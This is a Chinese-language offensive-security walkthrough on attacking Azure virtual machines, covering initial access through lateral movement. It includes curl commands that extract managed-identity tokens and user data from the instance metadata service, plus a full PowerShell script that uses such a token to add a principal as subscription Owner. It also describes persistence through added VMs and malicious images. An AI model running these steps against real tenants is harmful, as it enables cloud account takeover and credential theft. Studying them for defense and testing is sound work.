---
title: 微软云 VM 弹性计算服务攻防
id: azure_vm
---

## 0x01、初始访问
### 1、元数据
微软云元数据以 REST API 的形式公开。它的根端点是http://169.254.169.254/metadata

<!-- more -->

微软为其 API 端点实施了一些额外的安全措施——需要特殊的标头:Metadata:true

```
http://169.254.169.254/metadata/versions 元数据版本，元数据功能会不时更新，但需要在访问时指定版本以保持向后兼容性
http://169.254.169.254/metadata/instance?api-version=2021-05-01 实例元数据，实例元数据提供 VM 配置信息。
http://169.254.169.254/metadata/attested/document?api-version=2021-05-01 认证数据，认证数据是由Microsoft签名的数据
http://169.254.169.254/metadata/loadbalancer?api-version=2021-05-01 负载均衡器元数据
http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01 预定活动，获取VM即将要发生的事件的信息
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/ 获取访问令牌
```

### 2、凭证泄露
Azure 平台用户名密码泄露、Access token泄露
可能会存在服务帐号密钥的位置，包括：开源项目的源代码库、公共存储桶、遭破解服务的公共数据转储、电子邮件收件箱、文件共享、备份存储、临时文件系统目录

## 0x02、命令执行
### 1、添加订阅所有者
从元数据获取Azure Rest API得令牌，如果返回了一个令牌，那么你将拥有一个可使用得托管身份，然后可以利用此令牌和REST API一起使用，在Azure中执行操作。
```
#---------Query MetaData for SubscriptionID---------#
$response2 = Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/instance?api-version=2018-02-01' -Method GET -Headers @{Metadata="true"} -UseBasicParsing
$subID = ($response2.Content | ConvertFrom-Json).compute.subscriptionId


#---------Get OAuth Token---------#
$response = Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -Method GET -Headers @{Metadata="true"} -UseBasicParsing
$content = $response.Content | ConvertFrom-Json
$ArmToken = $content.access_token

#---------List Roles and Get Subscription Owner GUID---------#
$roleDefs = (Invoke-WebRequest -Uri (-join('https://management.azure.com/subscriptions/',$subID,'/providers/Microsoft.Authorization/roleDefinitions?api-version=2015-07-01')) -Method GET -Headers @{ Authorization ="Bearer $ArmToken"} -UseBasicParsing).Content | ConvertFrom-Json
$ownerGUID = ($roleDefs.value | ForEach-Object{ if ($_.properties.RoleName -eq 'Owner'){$_.name}})

#---------List current Subscription Owners---------#
$roleAssigns = (Invoke-WebRequest -Uri (-join('https://management.azure.com/subscriptions/',$subID,'/providers/Microsoft.Authorization/roleAssignments/?api-version=2015-07-01')) -Method GET -Headers @{ Authorization ="Bearer $ArmToken"} -UseBasicParsing).content | ConvertFrom-Json
$ownerList = ($roleAssigns.value.properties | where roleDefinitionId -like (-join('*',$ownerGUID,'*')) | select principalId)
Write-Host "Current 'Owner' Principal IDs ("($ownerList.Count)"):"
$ownerList | Out-Host


#---------Set JSON body for PUT request---------#
$JSONbody = @"
{
    "properties": {
        "roleDefinitionId": "/subscriptions/$subID/providers/Microsoft.Authorization/roleDefinitions/$ownerGUID", "principalId": "CHANGE-ME-TO-AN-ID"
    }
}
"@

#---------Add User as a Subscription Owner---------#
$fullResponse = (Invoke-WebRequest -Body $JSONbody -Uri (-join("https://management.azure.com/subscriptions/",$subID,"/providers/Microsoft.Authorization/roleAssignments/",$ownerGUID,"?api-version=2015-07-01")) -Method PUT -ContentType "application/json" -Headers @{ Authorization ="Bearer $ArmToken"} -UseBasicParsing).content | ConvertFrom-Json

#---------List updated Subscription Owners---------#
$roleAssigns = (Invoke-WebRequest -Uri (-join('https://management.azure.com/subscriptions/',$subID,'/providers/Microsoft.Authorization/roleAssignments/?api-version=2015-07-01')) -Method GET -Headers @{ Authorization ="Bearer $ArmToken"} -UseBasicParsing).content | ConvertFrom-Json
$ownerList = ($roleAssigns.value.properties | where roleDefinitionId -like (-join('*',$ownerGUID,'*')) | select principalId) 
Write-Host "Updated 'Owner' Principal IDs ("($ownerList.Count)"):"
$ownerList | Out-Host
```
通过添加的用户即可以去管理订阅

### 2、服务器命令执行
在拿到控制台权限后，可以通过控制台下的运行命令功能来操作虚拟机
![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-13/1649831444-423172-image.png)
![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-13/1649831458-668414-image.png)

### 3、SSH密钥泄露
## 0x03、权限提升
一旦我们可以访问托管身份并确认该身份的权限，我们就可以开始提升我们的权限
身份是订阅所有者：将访客身份添加到订阅
身份是订阅贡献者：虚拟机横向移动，托管标识可以通过Azure Cli或API在其他虚拟机上执行命令

## 0x04、权限维持
### 1、新增服务器
在拿到控制台后，添加一台虚拟机作为后续渗透的跳板
### 2、添加角色分配
分配角色时，必须指定一个范围。 范围是访问权限适用于的资源集。 在 Azure 中，可在从广义到狭义的四个级别指定范围：管理组、订阅、资源组或资源。
在顶部的“搜索”框中，搜索要授予对其的访问权限的范围。 例如，搜索“管理组”、“订阅”、“资源组”或某个特定资源 。
![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-13/1649831475-860093-image.png)
![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-13/1649831481-173554-image.png)

再用添加的用户去访问，可以控制该订阅下的所有资源
![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-13/1649831488-266770-image.png)


### 3、恶意镜像
我们可以通过创建镜像功能来创建恶意镜像
![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-13/1649831494-278581-image.png)


## 0x05、信息收集
### 1、元数据
微软云元数据以 REST API 的形式公开。它的根端点是http://169.254.169.254/metadata
获取实例元数据，实例元数据提供 VM 配置信息
`curl -H Metadata:true http://169.254.169.254/metadata/instance?api-version=2021-05-01`
![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-13/1649831551-301211-image.png)

获取认证数据
`curl -H Metadata:true http://169.254.169.254/metadata/attested/document?api-version=2021-05-01
`
![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-13/1649831559-131214-image.png)

获取负载均衡器元数据
`curl -H Metadata:true http://169.254.169.254/metadata/loadbalancer?api-version=2021-05-01
`

获取网络信息
`curl -H Metadata:true http://169.254.169.254/metadata/instance/network/interface/0?api-version=2021-01-01`
![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-13/1649831570-893215-image.png)


获取用户数据
`curl -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text" | base64 --decode
`
![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-13/1649831575-254295-image.png)


获取访问令牌
```
response=$(curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s)
access_token=$(echo $response | python -c 'import sys, json; print (json.load(sys.stdin)["access_token"])')
echo The managed identities for Azure resources access token is $access_token
```
![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-13/1649831585-233585-image.png)



### 2、资源信息
通过控制台所有资源查看该账户下所有资源。
![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-13/1649831605-196310-image.png)

### 3、订阅信息
组织可以有多个订阅，订阅名称通常提供信息。
![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-13/1649831609-828523-image.png)

### 4、用户信息
![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-13/1649831613-13312-image.png)


## 0x06、横向移动
### 1、虚拟机横向移动
### 2、控制台
通过拿到弱口令或者添加用户到订阅后，登录控制台可以去控制当前订阅下其他虚拟机。
![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-13/1649831618-477234-image.png)

## 0x07、影响
### 1、子域名接管
当域名对应的实例销毁或者当实例重新启动后对应的公网ip发生变化，但域名还是指向原来的公网ip，此时会存在子域名被接管的风险，但是由于公网ip的随机性，此攻击的利用成本较大。
![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-04-13/1649831622-758662-image.png)


## 0x08、总结
整体而言，微软云VM下的攻击手法主要还是由于凭证泄露、配置错误这类问题导致的。
## 0x09、参考：
https://docs.azure.cn/zh-cn/virtual-machines/windows/instance-metadata-service?tabs=linux
https://docs.azure.cn/zh-cn/active-directory/managed-identities-azure-resources/how-to-use-vm-token
https://docs.microsoft.com/zh-cn/azure/virtual-machines/linux/run-command
